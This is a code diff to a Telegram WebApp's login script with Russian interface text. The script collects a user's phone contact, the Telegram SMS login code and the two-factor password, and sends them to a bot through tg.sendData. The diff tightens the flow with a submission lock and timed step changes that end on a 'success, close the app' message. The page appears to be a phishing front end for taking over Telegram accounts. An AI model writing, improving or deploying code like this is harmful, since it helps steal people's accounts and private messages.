@@ -16,6 +16,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorMsg = document.getElementById('errorMsg');
 
     let currentStep = 'contact';  // Шаги: contact, code, 2fa
+    let awaitingResponse = false;
 
     loginBtn.addEventListener('click', () => {
         console.log('Login button clicked');
@@ -36,17 +37,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 statusMsg.textContent = 'Номер отправлен. Ожидаем SMS...';
                 tg.HapticFeedback.impactOccurred('light');
                 
-                // Немедленный переход к полю кода (бот отправит SMS)
+                // Переход к полю кода
                 setTimeout(() => {
                     console.log('Transition to code input');
                     phoneInput.classList.add('hidden');
                     codeInput.classList.remove('hidden');
                     submitBtn.classList.remove('hidden');
                     submitBtn.textContent = 'Отправить код';
-                    statusMsg.textContent = 'Введите SMS-код из Telegram. Проверьте чат с ботом для инструкций.';
+                    statusMsg.textContent = 'Введите SMS-код из Telegram. Проверьте чат с ботом.';
                     currentStep = 'code';
                     hideLoading();
-                }, 2000);  // Увеличено до 2 секунд для лучшего UX
+                }, 2000);
             } else {
                 console.error('Contact denied (null contact)');
                 hideLoading();
@@ -64,6 +65,10 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     submitBtn.addEventListener('click', () => {
+        if (awaitingResponse) {
+            console.log('Awaiting response, ignoring click');
+            return;
+        }
         const step = currentStep;
         let payload = {};
         console.log('Submit clicked, step:', step);
@@ -77,21 +82,12 @@ document.addEventListener('DOMContentLoaded', () => {
             }
             payload = { action: 'verify_code', code: code };
             console.log('Sending code data:', payload);
+            awaitingResponse = true;
             tg.sendData(JSON.stringify(payload));
             showLoading();
-            statusMsg.textContent = 'Проверяем код... Проверьте чат с ботом.';
+            statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
-            
-            // Не авто-переход, ждём сообщения от бота. Пользователь увидит в чате успех/ошибку/2FA
-            // Если успех или 2FA, пользователь может продолжить вручную или закрыть
-            setTimeout(() => {
-                hideLoading();
-                statusMsg.textContent = 'Код отправлен. Если 2FA требуется, введите пароль ниже. Иначе закройте приложение.';
-                instructionMsg.classList.remove('hidden');
-                twoFaInput.classList.remove('hidden');
-                submitBtn.textContent = 'Подтвердить 2FA (если нужно)';
-                currentStep = '2fa';
-            }, 5000);  // Дольше ждать, чтобы увидеть сообщение бота
+            // Ждём ответа от бота
             return;
         }
 
@@ -99,19 +95,12 @@ document.addEventListener('DOMContentLoaded', () => {
             const password = twoFaInput.value.trim();
             payload = { action: 'verify_2fa', password: password };
             console.log('Sending 2FA data:', payload);
+            awaitingResponse = true;
             tg.sendData(JSON.stringify(payload));
             showLoading();
             statusMsg.textContent = 'Подтверждаем 2FA...';
             tg.HapticFeedback.impactOccurred('heavy');
-            setTimeout(() => {
-                hideLoading();
-                successMsg.classList.remove('hidden');
-                submitBtn.classList.add('hidden');
-                instructionMsg.classList.add('hidden');
-                statusMsg.textContent = 'Успех! Закройте приложение.';
-                tg.HapticFeedback.notificationOccurred('success');
-                // Не авто-close, пусть пользователь закроет
-            }, 3000);
+            // Ждём ответа от бота
             return;
         }
     });
@@ -142,17 +131,44 @@ document.addEventListener('DOMContentLoaded', () => {
         errorMsg.classList.add('hidden');
         instructionMsg.classList.add('hidden');
         statusMsg.textContent = '';
+        awaitingResponse = false;
     }
+
+    // Обработчик сообщений от бота через Telegram WebApp
+    tg.onEvent('web_app_data', (data) => {
+        console.log('WebApp data received:', data);
+        // Это событие не используется напрямую, так как ответы приходят через чат
+    });
 
     tg.onEvent('webAppDataSent', () => {
         console.log('WebApp data sent');
         tg.HapticFeedback.impactOccurred('light');
+        setTimeout(() => {
+            if (currentStep === 'code') {
+                hideLoading();
+                instructionMsg.classList.remove('hidden');
+                twoFaInput.classList.remove('hidden');
+                submitBtn.textContent = 'Подтвердить 2FA (если нужно)';
+                statusMsg.textContent = 'Код отправлен. Проверьте чат с ботом. Если требуется 2FA, введите пароль.';
+                currentStep = '2fa';
+                awaitingResponse = false;
+            } else if (currentStep === '2fa') {
+                hideLoading();
+                successMsg.classList.remove('hidden');
+                submitBtn.classList.add('hidden');
+                instructionMsg.classList.add('hidden');
+                statusMsg.textContent = 'Успех! Закройте приложение.';
+                tg.HapticFeedback.notificationOccurred('success');
+                awaitingResponse = false;
+            }
+        }, 2000); // Задержка для ответа от бота
     });
 
     tg.onEvent('error', (error) => {
         console.error('WebApp error:', error);
         hideLoading();
-        errorMsg.textContent = '❌ Ошибка: ' + (error || 'Неизвестная ошибка');
+        errorMsg.textContent = '❌ Ошибка: ' + (error.message || 'Неизвестная ошибка');
         errorMsg.classList.remove('hidden');
+        awaitingResponse = false;
     });
 });
